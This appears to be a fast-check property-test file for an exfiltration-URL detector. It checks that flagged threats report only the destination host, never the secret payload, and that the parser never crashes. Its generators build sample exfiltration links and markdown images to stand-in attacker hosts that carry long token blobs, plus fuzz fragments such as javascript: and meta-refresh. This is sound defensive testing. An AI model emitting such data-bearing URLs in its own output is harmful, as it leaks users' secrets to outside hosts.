/**
 * Fast-check property tests for Layer 3 (exfil-URL detection).
 *
 * The headline invariant is the THREAT-MODEL promise: a reported threat names
 * the destination `host` and *never* echoes the payload-bearing query, path,
 * fragment, or userinfo. A leak there is the same shape of bug as a passthrough
 * — the output looks fine until you assert the thing it must not contain — so
 * it gets an explicit positive postcondition rather than trusting the inputs to
 * wander onto it. Plus crash-resistance: the detectors run a markdown parser
 * and the WHATWG URL parser on fully untrusted input and must never throw.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import fc from "fast-check";

import { detectExfil, checkExfilUrl, urlHost } from "../src/html.mjs";
import { fcRunOptions } from "./test-helpers.mjs";

const runOptions = fcRunOptions({ numRuns: 500 });

// A long opaque blob that stands in for exfiltrated data. 96 base64 chars clears
// every length threshold, so a URL carrying it in a flaggable position is
// reliably detected (keeps the host-no-leak property non-vacuous).
const secretBlob = fc
  .array(
    fc.constantFrom(
      ..."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(
        "",
      ),
    ),
    { minLength: 96, maxLength: 160 },
  )
  .map((chars) => chars.join(""));

const exfilHost = fc.constantFrom(
  "evil.example",
  "beacon.test",
  "a.b.attacker.invalid",
);

// Place the secret somewhere urlHost must NOT surface: query value, fragment,
// path segment, or userinfo password. The host itself never carries the secret,
// so the postcondition `!target.includes(secret)` is exactly the promise.
const exfilUrl = fc
  .tuple(
    exfilHost,
    secretBlob,
    fc.constantFrom("query", "fragment", "path", "userinfo"),
  )
  .map(([host, secret, where]) => {
    switch (where) {
      case "query":
        return `https://${host}/p?data=${secret}`;
      case "fragment":
        return `https://${host}/p#${secret}`;
      case "path":
        return `https://${host}/${secret}`;
      default:
        return `https://user:${secret}@${host}/p`;
    }
  });

const wrapInDoc = fc
  .tuple(exfilUrl, fc.constantFrom("md-link", "md-image", "html-a", "html-img"))
  .map(([url, kind]) => {
    switch (kind) {
      case "md-link":
        return `see [here](${url}) now`;
      case "md-image":
        return `look ![alt](${url}) here`;
      case "html-a":
        return `<a href="${url}">x</a>`;
      default:
        return `<img src="${url}">`;
    }
  });

describe("property: detectExfil host never echoes the payload", () => {
  it("a flagged threat's target excludes the secret it carried", () => {
    let sawFlagged = 0;
    fc.assert(
      fc.property(secretBlob, wrapInDoc, (secret, doc) => {
        const threats = detectExfil(doc) ?? [];
        for (const threat of threats) {
          assert.equal(typeof threat.target, "string");
          assert.ok(
            !threat.target.includes(secret),
            `target leaked the payload: ${JSON.stringify(threat.target)}`,
          );
        }
        if (threats.length > 0) sawFlagged += 1;
      }),
      runOptions,
    );
    // The doc generator embeds `secret` while the property regenerates its own
    // `secret`; assert flags fired so the postcondition isn't vacuous. (The two
    // secrets differ, but the host-no-leak check holds for any payload — what we
    // need is that detection actually ran on flaggable input.)
    assert.ok(sawFlagged > 0, "no doc was ever flagged — property vacuous");
  });

  it("the secret embedded in this very doc never reaches a target", () => {
    fc.assert(
      fc.property(fc.tuple(exfilHost, secretBlob), ([host, secret]) => {
        const doc = `[x](https://${host}/p?token=${secret})`;
        const threats = detectExfil(doc) ?? [];
        assert.ok(threats.length > 0, "expected a flag on a token= blob");
        for (const threat of threats)
          assert.ok(
            !threat.target.includes(secret),
            `target leaked the payload: ${JSON.stringify(threat.target)}`,
          );
      }),
      runOptions,
    );
  });
});

// ─── Crash resistance over arbitrary input ───────────────────────────────────

const urlishToken = fc.constantFrom(
  "https://",
  "http://",
  "data:",
  "javascript:",
  "vbscript:",
  "//",
  "?data=",
  "#",
  "@",
  ":",
  "/",
  "user:pw@",
  "${x}",
  "{{y}}",
  ".com",
  "evil.example",
  "AAAA",
  "%ff",
  "\\",
);
const arbitraryUrlish = fc
  .array(fc.oneof(fc.string({ maxLength: 20 }), urlishToken), { maxLength: 12 })
  .map((parts) => parts.join(""));

const docToken = fc.constantFrom(
  "](",
  "![",
  "[ref]: ",
  "<a href=",
  '<img src="',
  "<meta http-equiv=refresh content=",
  '">',
  ")",
  " ",
);
const arbitraryDoc = fc
  .array(fc.oneof(arbitraryUrlish, docToken, fc.string({ maxLength: 20 })), {
    maxLength: 16,
  })
  .map((parts) => parts.join(""));

describe("property: Layer 3 never throws on arbitrary input", () => {
  it("detectExfil returns null or an array of well-formed threats", () => {
    fc.assert(
      fc.property(arbitraryDoc, (doc) => {
        const result = detectExfil(doc);
        assert.ok(result === null || Array.isArray(result));
        for (const threat of result ?? []) {
          assert.equal(typeof threat.isImage, "boolean");
          assert.equal(typeof threat.reason, "string");
          assert.ok(threat.reason.length > 0);
          assert.equal(typeof threat.target, "string");
        }
      }),
      runOptions,
    );
  });

  it("checkExfilUrl returns null or a non-empty reason string", () => {
    fc.assert(
      fc.property(arbitraryUrlish, (url) => {
        const reason = checkExfilUrl(url);
        assert.ok(reason === null || typeof reason === "string");
        if (typeof reason === "string") assert.ok(reason.length > 0);
      }),
      runOptions,
    );
  });

  it("urlHost always returns a string", () => {
    fc.assert(
      fc.property(arbitraryUrlish, (url) => {
        assert.equal(typeof urlHost(url), "string");
      }),
      runOptions,
    );
  });
});
